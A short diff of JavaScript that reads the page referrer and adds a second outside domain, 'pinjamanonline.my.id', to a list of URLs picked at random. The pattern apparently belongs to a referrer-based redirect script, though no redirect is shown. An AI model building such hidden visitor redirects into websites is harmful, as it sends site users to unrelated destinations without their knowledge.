@@ -4,7 +4,8 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://semuada.eu.org',						
+							'https://semuada.eu.org',
+							'https://pinjamanonline.my.id',
 							]);
 
 				function rChoice(arr) {
